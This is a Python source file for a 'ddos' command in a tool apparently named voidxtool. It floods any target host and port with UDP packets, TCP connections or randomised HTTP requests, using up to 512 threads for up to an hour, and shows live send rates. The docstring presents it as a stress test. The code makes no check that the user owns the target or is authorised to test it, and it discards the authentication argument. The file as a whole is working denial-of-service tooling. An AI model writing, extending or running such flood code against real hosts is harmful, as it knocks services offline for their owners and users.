"""
DDoS stress command — multithreaded UDP/TCP/HTTP flood.
Usage: ddos <host:port> <method> <threads> <duration>
Methods: udp | tcp | http
"""

from __future__ import annotations

import random
import socket
import string
import threading
import time
from typing import Literal

import requests
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.table import Table

from voidxtool.auth import Authentication
from voidxtool.commands.base import BaseCommand

console = Console()

Method = Literal["udp", "tcp", "http"]

VALID_METHODS: set[str] = {"udp", "tcp", "http"}
MAX_THREADS   = 512
MAX_DURATION  = 3600
PAYLOAD_SIZE  = 1024


class _Stats:
    def __init__(self) -> None:
        self.sent   = 0
        self.errors = 0
        self._lock  = threading.Lock()

    def inc_sent(self)  -> None:
        with self._lock: self.sent   += 1

    def inc_error(self) -> None:
        with self._lock: self.errors += 1


def _udp_worker(host: str, port: int, stop: threading.Event, stats: _Stats) -> None:
    payload = random.randbytes(PAYLOAD_SIZE)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while not stop.is_set():
            try:
                sock.sendto(payload, (host, port))
                stats.inc_sent()
            except OSError:
                stats.inc_error()
    finally:
        sock.close()


def _tcp_worker(host: str, port: int, stop: threading.Event, stats: _Stats) -> None:
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            s.sendall(random.randbytes(PAYLOAD_SIZE))
            stats.inc_sent()
            s.close()
        except OSError:
            stats.inc_error()


def _http_worker(host: str, port: int, stop: threading.Event, stats: _Stats) -> None:
    scheme  = "https" if port == 443 else "http"
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; stress-test/1.0)",
        "Accept": "*/*",
        "Connection": "keep-alive",
    }
    while not stop.is_set():
        try:
            path = "/" + "".join(random.choices(string.ascii_lowercase, k=8))
            session.get(f"{scheme}://{host}:{port}{path}", headers=headers, timeout=4)
            stats.inc_sent()
        except Exception:
            stats.inc_error()


_WORKERS = {"udp": _udp_worker, "tcp": _tcp_worker, "http": _http_worker}


class DdosCommand(BaseCommand):
    """Multithreaded UDP / TCP / HTTP flood."""

    def __init__(self) -> None:
        super().__init__("ddos")
        self.host:     str = ""
        self.port:     int = 0
        self.method:   str = "udp"
        self.threads:  int = 100
        self.duration: int = 30

    def custom_validate_arguments(self, user_arguments: list) -> bool:
        target = str(user_arguments[0]).strip()
        if ":" in target:
            parts      = target.rsplit(":", 1)
            self.host  = parts[0]
            try:
                self.port = int(parts[1])
            except ValueError:
                console.print("[red]Invalid port in target.[/red]")
                return False
        else:
            self.host = target
            self.port = 80

        self.method = str(user_arguments[1]).lower() if len(user_arguments) > 1 else "udp"
        if self.method not in VALID_METHODS:
            console.print(f"[red]Method must be one of: {', '.join(VALID_METHODS)}[/red]")
            return False

        try:
            self.threads  = int(user_arguments[2]) if len(user_arguments) > 2 else 100
            self.duration = int(user_arguments[3]) if len(user_arguments) > 3 else 30
        except ValueError:
            console.print("[red]Threads and duration must be integers.[/red]")
            return False

        if not 1 <= self.port <= 65535:
            console.print("[red]Port out of range (1–65535).[/red]")
            return False
        if not 1 <= self.threads <= MAX_THREADS:
            console.print(f"[red]Threads must be 1–{MAX_THREADS}.[/red]")
            return False
        if not 1 <= self.duration <= MAX_DURATION:
            console.print(f"[red]Duration must be 1–{MAX_DURATION}s.[/red]")
            return False

        return True

    def run(self, arguments: list, authentication: Authentication) -> bool:
        del authentication
        if not self.validate_arguments(arguments):
            return False

        try:
            resolved = socket.gethostbyname(self.host)
        except socket.gaierror as exc:
            console.print(f"[red]Could not resolve {self.host}: {exc}[/red]")
            return False

        stats    = _Stats()
        stop_evt = threading.Event()
        worker   = _WORKERS[self.method]

        threads: list[threading.Thread] = []
        for _ in range(self.threads):
            t = threading.Thread(
                target=worker,
                args=(resolved, self.port, stop_evt, stats),
                daemon=True,
            )
            t.start()
            threads.append(t)

        deadline = time.monotonic() + self.duration
        start_ts = time.monotonic()

        def _live_table() -> Table:
            elapsed   = max(0.001, time.monotonic() - start_ts)
            pps       = int(stats.sent / elapsed)
            remaining = max(0, int(deadline - time.monotonic()))
            tbl = Table(show_header=True, header_style="bold bright_magenta")
            tbl.add_column("Target",    style="cyan")
            tbl.add_column("Method",    style="yellow")
            tbl.add_column("Threads",   style="green")
            tbl.add_column("Sent",      style="bright_green")
            tbl.add_column("Errors",    style="bright_red")
            tbl.add_column("Pkt/s",     style="bright_yellow")
            tbl.add_column("Remaining", style="white")
            tbl.add_row(
                f"{self.host}:{self.port}",
                self.method.upper(),
                str(self.threads),
                str(stats.sent),
                str(stats.errors),
                str(pps),
                f"{remaining}s",
            )
            return tbl

        try:
            with Live(console=console, refresh_per_second=4) as live:
                while time.monotonic() < deadline:
                    live.update(_live_table())
                    time.sleep(0.25)
        except KeyboardInterrupt:
            pass
        finally:
            stop_evt.set()
            for t in threads:
                t.join(timeout=1.0)

        elapsed = time.monotonic() - start_ts
        pps     = int(stats.sent / elapsed) if elapsed > 0 else 0

        console.print(Panel(
            f"[bold]Target:[/bold]   {self.host}:{self.port}\n"
            f"[bold]Method:[/bold]   {self.method.upper()}\n"
            f"[bold]Threads:[/bold]  {self.threads}\n"
            f"[bold]Sent:[/bold]     {stats.sent:,} packets  ({pps:,}/s avg)\n"
            f"[bold]Errors:[/bold]   {stats.errors:,}\n"
            f"[bold]Duration:[/bold] {elapsed:.2f}s",
            title="[bold bright_magenta]FLOOD COMPLETE[/bold bright_magenta]",
            border_style="bright_cyan",
        ))
        return True
